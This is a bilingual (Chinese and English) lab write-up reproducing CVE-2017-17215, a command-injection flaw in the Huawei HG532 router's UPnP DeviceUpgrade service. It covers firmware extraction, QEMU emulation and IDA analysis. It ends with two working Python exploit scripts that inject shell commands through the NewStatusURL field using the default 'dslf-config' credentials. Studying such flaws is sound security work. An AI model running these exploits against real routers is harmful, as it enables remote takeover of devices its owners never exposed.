#  Hg-532漏洞复现

~~~apl
#  分析bin 文件
binwalk HG532eV100R001C01B020_upgrade_packet.bin  #  发现是 big endian version 3.0和created: 2012-07-21 02:15:38

#  提取固件
binwalk -Me1 HG532eV100R001C01B020_upgrade_packet.bin  # -Me1 作用是让文件动态挂载

#  查找开机启动项位置  
find ./ -name 'rcS' 2>/dev/null  #  得到./etc/init.d/rcS

#  查看开机启动项内容
cat ./etc/init.d/rcS  #  发现了许多路径并导出

#  查看第一个路径sbin,发现 sbin 文件夹下全部指向 ./bin/busybox
#  查看第二个路径bin,发现很多命令全部指向了 busybox,发现了 upnu(协议)

#  检查 busybox 文件
checksec busybox  #  知道了是 mips-32-big

#  查看第三个路径usr/bin,发现了所有文件全部指向 busybox
#  查看第四个路径的时候发现是没有的
#  这次需要复现的漏洞是基于 upnp协议的漏洞,所以这次和之前的静态模拟不大一样
#  这次是需要模拟这个系统,所以我们需要去找到对应的镜像和磁盘
#  现在的已知信息是：固件系统是3.0版本创建时间是 2012 年,需要模拟整个系统,缺少硬盘和对应的系统镜像(通过版本和时间知道是老版本的，所以我们需要去找通用版本)

#  使用Google 语法搜索 定位到了网址
site:people.debian.org qemu mips
site:kernel.org malta vmlinux mips

#  找到路径后可以使用 wget 下载
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta

#  到目前为止，我们还是不知道启动的是什么服务，这时候我们要去 bin 目录下,因为在rcS 中有指定路径 bin,又因为bin 目录下一般会存放服务所以我们需要来这个目录下排查

#  查看该目录
ls

#  查看后会发现有许多命令和服务,命令全部指向了 busybox,所以我们接下来要做验证
#  首先我们知道这个路由器的交互肯定是在web端的,所以我们需要检索和 web、http相关联的文件
 grep -ir "web" | grep -ir "http"
 
 #  检索后我们会发现，除了 mic 这个东西，其余的都是我们知道的文件或命令，所以我们十分有理由怀疑这个 mic 就是我们要启动服务的文件,走的协议是 upnp 协议
~~~

![](/Image/hg532_img/532-1.png)

![](/Image/hg532_img/532-2.png)

![](/Image/hg532_img/532-3.png)

![](/Image/hg532_img/532-4.png)



编写启动脚本

~~~apl
# start.sh
#!/bin/sh
qemu-system-mips -M malta \
-kernel vmlinux-2.6.32-5-4kc-malta \
-hda debian_squeeze_mips_standard.qcow2 \
-append "root=/dev/sda1 console=tty0" \
-netdev tap,id=tapnet,ifname=tap0,script=no \
-device rtl8139,netdev=tapnet \
-nographic
~~~

~~~apl
# 启动模拟
./start.sh

#  启动报错，修改磁盘大小为 32g
qemu-img resize debian_wheezy_armhf_standard.qcow2 32G

#  配置 qemu 模拟的网络
ip link add br0 type dummy
ip link set br0 up
ifconfig eth0 192.168.3.3/24 up
ifconfig br0 192.168.3.4/24 up

#  打包上传系统文件  
tar -cvf new_filename.tar.gz system_filename

#  使用python3开启http服务 并上传解压
tar -xvf new_filename.tar.gz

#  挂载程序文件
mount -o bind /dev ./squashfs-root/dev  #  挂载设备
mount -t proc /proc ./squashfs-root/proc  #  挂载进程

#  ssh 链接的问题 因为镜像版本较老 ssh username@host 链接失败,使用旧版链接
ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.3.4 

#  详细说一下为什么开启 ssh 链接:因为在第一次启动模拟后开启服务的时候会发现一个问题,启动后之前设置好的 ip 会变成 192.168.1.1 和清空之前的网络设置,所以我们要用 ssh 链接去启动服务,在模拟起来的系统中重新修改 ip 进行访问 192.168.3.3

#  访问的时候发信报错了，现在需要去检查服务是否正常开启
curl -v http://192.168.3.3:80   #  发现是服务是正常启动的

#  点击 learn more 看看原因 发现是和 SSL_ERROR_UNSUPPORTED_VERSION 相关
#  通过问查询得知 我们需要进入火狐的配置文件 about:config 配置文件
#  搜索 security.tls.ver(控制 Firefox 在建立安全连接的首选项)
#  security.tls.version.Fallback-limit  tls报错的回退版本
#  security.tls.version.min  最低版本
#  将上述两个选项设置为 1 即可
~~~

![](/Image/hg532_img/532-5.png)

![](/Image/hg532_img/532-6.png)

![](/Image/hg532_img/532-7.png)

CVE-2017-17215分析

~~~apl
#  CVE-2017-17215 是影响 Huawei HG532（及某些定制固件） 的远程命令执行漏洞：攻击者通过向设备上暴露的 UPnP/TR-064 服务（通常监听在 端口 37215）发送构造的请求，在 DeviceUpgrade 服务的 URL 字段中注入 shell 元字符（例如 $(...)），导致设备执行任意命令，从而实现 RCE

#  功能位于 TR-064 / UPnP 的 DeviceUpgrade 服务：设备的 UPnP 描述（device.xml / SCPD）包含一个 DeviceUpgrade service，支持接收 NewStatusURL、NewDownloadURL 等参数用于固件升级流程。控制点/管理端向设备的 controlURL 发起包含这些参数的请求。

#  验证进程
ps aux  

#  验证端口
netstat -tunla

-----------------------------------------------------------------------------
#  根据上述的分析我们先需要把 upnp 二进制文件丢入 IDA 进行静态分析
#  定位 NewStatusURL NewDownloadURL
#  找到函数sub_40749C
#  通过对函数sub_40749C分析可以知道
#  NewStatusURL 和 NewDownloadURL 都是被ATP_XML_GetChildNodeByName进行了处理
#  处理完了以后,进入拼接打印 再由 system 执行
#  知道大体漏洞原理后，我们需要去找到NewStatusURL 和 NewDownloadURL 所在的位置
#  想交叉引用去看谁调用了这个函数结果发现没有

#  去文件系统检索和NewDownloadURL有关联的文件
grep -r 'NewDownloadURL'  #  etc/upnp/DevUpg.xml

#  查看该文件
less etc/upnp/DevUpg.xml

#  IDA 检索关键字DevUpg.xml 定位函数 ATP_UPNP_RegDeviceAndServic
#  分析函数 ATP_UPNP_RegDeviceAndService  这个函数的大概逻辑就是 注册一个设备后紧接着就会为这个设备开启多个服务，每个行为会给一个相对的编号和存储地址
#  把编号分给到不同的寄存器并赋值给 result，这里我们需要先注意的就是这个编号 2 因为这个编号 2 的操作就是在处理升级的操作
#  接下来就是在判断这个rusult是不是存在(也就是说在判断上面的升级是否处理完)如果处理完，程序就会继续向下执行
~~~

![](/Image/hg532_img/532-9.png)

![](/Image/hg532_img/532-10.png)

![](/Image/hg532_img/532-8.png)

![](/Image/hg532_img/532-11.png)

![](/Image/hg532_img/532-12.png)

![](/Image/hg532_img/532-14.png)

~~~apl
#  分析函数ATP_UPNP_RegAction在做什么，进入函数后我们可以发现这函数是带着 a1 和 a2 进来的，a1 是 url a2 是操作编号 2
#  接下来就是要去看下这个全局变量g_astActionArray是存放的什么,进入该全局变量定位到函数UPnPGetActionByName,进入该函数还是会发现这个全局变量,我们需要看下谁调用这个函数,通过交叉引用看到函数UPnPGetActionByName的上一层是 sub_40A9C8
#  分析函数 sub_40A9C8,已知 a2 是在上面传进来的,所以我们需要看看a2在这个函数里是被怎么处理的,由下图我们可以看到,a2是先被处理后赋值给了 v5,而v5 又被一个处理serverURL 的函数所处理,那么我们要接着去看看这个函数UpnpGetServiceByUrl在处理什么
#  分析函数UpnpGetServiceByUrl,进来后我们就可以看到,函数先判断url是否存在,存在的话在校验url后面是否拼接了/ctrlt/ 如果为真的话,就把URL+/ctrlt/赋给V4,然后去LABEL_9,来到LABEL_9后,先给j初始化,判断URL+/ctrlt/是否为真,如果为真的话,就去全局变量g_pstUpnpGvarHead中遍历一个值拼接在 URL+/ctrlt/的后面,然后就执行我们的命令注入点。
#  经过上面的分析。我们现在得到的结论就是命令注入点的路径为  URL/ctrlt/xxxxx,因为我们是访问的该路由器的 web 端,所以 URL应该是路由器的 ip,又因为我们知道这个漏洞注入点是在执行升级的时候存在的,通过之前的分析,我们知道处理升级这个程序的是通过 xml 文件传输的,而 xml 文件传输又是走的37215 端口,由此可知我们 URL=ip:37215。到此为止,我们的整体路径为  ip:37215/ctrlt/xxxx  接下来我们需要去找到我们路径后面拼接的字段就可以知道完整的路径。所以接下来我们就是需要去找到这个字段
#  
~~~



![](/Image/hg532_img/532-15.png)

![](/Image/hg532_img/532-16.png)

![](/Image/hg532_img/532-17.png)

![](/Image/hg532_img/532-18.png)

![](/Image/hg532_img/532-19.png)

![](/Image/hg532_img/532-20.png)



~~~apl
#  在我们之前分析ATP_UPnP_RegDevice的时候可以看到,注册服务的时候是给了很多参数的,其中重点关注一下DeviceUpgrade:1,经过我们对APT_UPnP_RegService 的分析和后续的分析,发现程序是给DeviceUpgrade:1用_重新拼接的并加在了/ctrlt/后
#  到这里我们就得到了一个完整的路径 http://<ip>:37251/ctrlt/DeviceUpgrade_1/
~~~

![](/Image/hg532_img/532-24.png)

构造exp

~~~python
import requests   
import sys
headers = {  
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"  
}  
  
data = f'''<?xml version="1.0" ?>  
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">  
   <NewStatusURL>;{sys.argv[1]};</NewStatusURL>  
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>  
  </u:Upgrade>  
</s:Body>  
</s:Envelope>  
'''  
requests.post('http://192.168.3.3:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
~~~

~~~apl
python3 532_exp_1.py 
~~~

![](/Image/hg532_img/532-25.png)

exp2

~~~~python
import requests
import click
from threading import Thread
from requests.auth import HTTPDigestAuth

print(f"""
$$$$$$\  $$\    $$\ $$$$$$$$\       $$$$$$\   $$$$$$\    $$\   $$$$$$$$\       $$\   $$$$$$$$\  $$$$$$\    $$\  $$$$$$$|
$$  __$$\ $$ |   $$ |$$  _____|     $$  __$$\ $$$ __$$\ $$$$ |  \____$$  |    $$$$ |  \____$$  |$$  __$$\ $$$$ | $$  ____|
$$ /  \__|$$ |   $$ |$$ |           \__/  $$ |$$$$\ $$ |\_$$ |      $$  /     \_$$ |      $$  / \__/  $$ |\_$$ | $$ |
$$ |      \$$\  $$  |$$$$$\ $$$$$$\  $$$$$$  |$$\$$\$$ |  $$ |     $$  /$$$$$$\ $$ |     $$  /   $$$$$$  |  $$ | $$$$$$$|
$$ |       \$$\$$  / $$  __|\______|$$  ____/ $$ \$$$$ |  $$ |    $$  / \______|$$ |    $$  /   $$  ____/   $$ | \_____$$|
$$ |  $$\   \$$$  /  $$ |           $$ |      $$ |\$$$ |  $$ |   $$  /          $$ |   $$  /    $$ |        $$ | $$\   $$ |
\$$$$$$  |   \$  /   $$$$$$$$\      $$$$$$$$\ \$$$$$$  /$$$$$$\ $$  /         $$$$$$\ $$  /     $$$$$$$$\ $$$$$$$$$$$$$$  |
 \______/     \_/    \________|     \________| \______/ \______|\__/          \______|\__/      \________|\______|\______/
""")

@click.command()
@click.option('-i', '--ip', help="Target ip to attack.")
@click.option('-c', '--command', type=str, help="Command want to execute.")
def attack(ip, command):
    print("[+] Start Attacking...")
    url = f"http://{ip}:37215/ctrlt/DeviceUpgrade_1"
    payload = '''<?xml version=\"1.0\" ?>\n'''
    payload += '''<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n'''
    payload += '''<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n'''
    payload += f"<NewStatusURL>;{command};</NewStatusURL>\n"
    payload += '''<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n'''
    payload += '''</s:Body>\n'''
    payload += '''</s:Envelope>'''

    resp = requests.post(url,auth = HTTPDigestAuth('dslf-config', 'admin') ,data = payload)
    if resp.status_code == 200:
        print("[+] Attack Success.")
    else:
        print("[+] Ooops! Attack faild, something wrong.")

if __name__ == '__main__':
    attack()
~~~~

~~~apl
python3  hg532_exp.py -i 192.168.3.3 -c " cat /etc/profile>/tmp/hacker1"
~~~

![](/Image/hg532_img/532-26.png)

![](/Image/hg532_img/532-27.png)

------

# HG-532 Vulnerability Reproduction

### Analyze the BIN File

```
binwalk HG532eV100R001C01B020_upgrade_packet.bin
```

- Found it is **big-endian version 3.0**, created: **2012-07-21 02:15:38**

```
binwalk -Me1 HG532eV100R001C01B020_upgrade_packet.bin
```

- `-Me1` dynamically mounts the file

### Locate Startup Scripts

```
find ./ -name 'rcS' 2>/dev/null
```

- Result: `./etc/init.d/rcS`

```
cat ./etc/init.d/rcS
```

- Found many paths and exported them

1. Check the first path `sbin`: all files point to `./bin/busybox`
2. Check the second path `bin`: many commands all point to `busybox`, discovered `upnp` protocol
3. Check `busybox` security:

```
checksec busybox
```

- It is **mips-32-big endian**

1. Check `usr/bin`: all files point to `busybox`
2. The fourth path does not exist

------

### Focus on UPnP Vulnerability

- This time the vulnerability is **based on the UPnP protocol**, so unlike previous static analysis, **we need to simulate the system**
- Known info: **Firmware version 3.0, created in 2012**
- Missing hard disk and system image; need to find a general version for simulation

#### Download System Image and Kernel

```
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```

- Still unknown which service starts
- Check `bin` directory because `rcS` specifies `bin` and it usually contains services

```
ls bin
```

- Many commands point to `busybox`, next is verification
- Router interaction is **web-based**, so search files related to web/HTTP:

```
grep -ir "web" | grep -ir "http"
```

- Found `mic` is likely the executable for the service, using **UPnP protocol**

![img](/Image/hg532_img/532-1.png) 
 ![img](/Image/hg532_img/532-2.png)
 ![img](/Image/hg532_img/532-3.png)
 ![img](/Image/hg532_img/532-4.png) 

------

### Write Startup Script

```
# start.sh
#!/bin/sh
qemu-system-mips -M malta \
  -kernel vmlinux-2.6.32-5-4kc-malta \
  -hda debian_squeeze_mips_standard.qcow2 \
  -append "root=/dev/sda1 console=tty0" \
  -netdev tap,id=tapnet,ifname=tap0,script=no \
  -device rtl8139,netdev=tapnet \
  -nographic
./start.sh
```

- Startup error → resize disk to 32G

```
qemu-img resize debian_wheezy_armhf_standard.qcow2 32G
```

- Configure QEMU network:

```
ip link add br0 type dummy
ip link set br0 up
ifconfig eth0 192.168.3.3/24 up
ifconfig br0 192.168.3.4/24 up
```

- Pack system files:

```
tar -cvf new_filename.tar.gz system_filename
```

- Use Python 3 to start HTTP service and upload/extract:

```
tar -xvf new_filename.tar.gz
```

- Mount program files:

```
mount -o bind /dev ./squashfs-root/dev
mount -t proc /proc ./squashfs-root/proc
```

- SSH connection issue: old image version may fail
- Use old version SSH:

```
ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.3.4
```

- Reason to use SSH: after first boot, IP reverts to `192.168.1.1`, so we must SSH to reconfigure IP to `192.168.3.3`

```
curl -v http://192.168.3.3:80
```

- Service runs normally
- Firefox SSL error fix: `SSL_ERROR_UNSUPPORTED_VERSION`
- Go to `about:config` and set:
  - `security.tls.version.Fallback-limit = 1`
  - `security.tls.version.min = 1`

![img](/Image/hg532_img/532-5.png) 
 ![img](/Image/hg532_img/532-6.png)
 ![img](/Image/hg532_img/532-7.png)

------

### CVE-2017-17215 Analysis

- Affects Huawei HG532 (and some custom firmware) **remote command execution**
- Exploit: send crafted request to **DeviceUpgrade service** via UPnP/TR-064 on port **37215**
- Inject shell metacharacters (`$(...)`) in `URL` field → arbitrary command execution (RCE)
- DeviceUpgrade service in **UPnP description** (`device.xml` / SCPD)
- Receives `NewStatusURL`, `NewDownloadURL` for firmware upgrade
- Management/control client sends request to controlURL with these parameters

#### Verify Process and Ports

```
ps aux
netstat -tunla
```

- Static analysis in IDA: `upnp` binary
- Locate `NewStatusURL` and `NewDownloadURL` → `sub_40749C`
- These fields handled by `ATP_XML_GetChildNodeByName`, then concatenated and executed via `system`
- Search which files reference `NewDownloadURL`:

```
grep -r 'NewDownloadURL'
```

- Found: `etc/upnp/DevUpg.xml`
- IDA search: `DevUpg.xml` → `ATP_UPNP_RegDeviceAndServic`
- Function registers device → starts multiple services → assigns service IDs
- Focus on ID **2** → handles upgrade operations

![img](/Image/hg532_img/532-9.png) 
 ![img](/Image/hg532_img/532-10.png)
 ![img](/Image/hg532_img/532-8.png) 
 ![img](/Image/hg532_img/532-11.png)
 ![img](/Image/hg532_img/532-12.png) 
 ![img](/Image/hg532_img/532-14.png) 

------

### Analyze `ATP_UPNP_RegAction`

- `a1` = URL, `a2` = action ID 2
- Global variable: `g_astActionArray` → stores actions
- Check `UPnPGetActionByName` → called by `sub_40A9C8`
- `a2` processed → assigned to `v5` → passed to function handling serverURL → `UpnpGetServiceByUrl`
- Function logic:
  - If `url` exists, append `/ctrlt/`
  - Traverse `g_pstUpnpGvarHead` → build final command injection point
- Command injection path: `URL/ctrlt/xxxxx`
- Port: **37215** → path: `ip:37215/ctrlt/xxxx`
- Service uses XML for firmware upgrade → injection occurs here

![img](/Image/hg532_img/532-15.png) 
 ![img](/Image/hg532_img/532-16.png)
 ![img](/Image/hg532_img/532-17.png)
 ![img](/Image/hg532_img/532-18.png)
 ![img](/Image/hg532_img/532-19.png)
 ![img](/Image/hg532_img/532-20.png)

------

### Full Path

- `ATP_UPnP_RegDevice` → registers DeviceUpgrade:1 → builds `_` concatenated path
- Complete URL:

```
http://<ip>:37215/ctrlt/DeviceUpgrade_1/
```

![img](/Image/hg532_img/532-24.png)

------

### Construct Exploit

```py
import requests
import sys

headers = {
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
}

data = f'''<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
    <NewStatusURL>;{sys.argv[1]};</NewStatusURL>
    <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
  </s:Body>
</s:Envelope>
'''

requests.post('http://192.168.3.3:37215/ctrlt/DeviceUpgrade_1', headers=headers, data=data)
python3 532_exp_1.py
```



![img](/Image/hg532_img/532-25.png)

------

### Exploit 2

```py
import requests
import click
from threading import Thread
from requests.auth import HTTPDigestAuth

@click.command()
@click.option('-i', '--ip', help="Target ip to attack.")
@click.option('-c', '--command', type=str, help="Command want to execute.")
def attack(ip, command):
    print("[+] Start Attacking...")
    url = f"http://{ip}:37215/ctrlt/DeviceUpgrade_1"
    payload = '''<?xml version="1.0" ?>\n'''
    payload += '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n'''
    payload += '''<s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\n'''
    payload += f"<NewStatusURL>;{command};</NewStatusURL>\n"
    payload += '''<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n'''
    payload += '''</s:Body>\n</s:Envelope>'''
    
    resp = requests.post(url, auth=HTTPDigestAuth('dslf-config', 'admin'), data=payload)
    if resp.status_code == 200:
        print("[+] Attack Success.")
    else:
        print("[+] Ooops! Attack failed, something wrong.")

if __name__ == '__main__':
    attack()
python3 hg532_exp.py -i 192.168.3.3 -c " cat /etc/profile>/tmp/hacker1"
```



![img](/Image/hg532_img/532-26.png)
 ![img](/Image/hg532_img/532-27.png) 
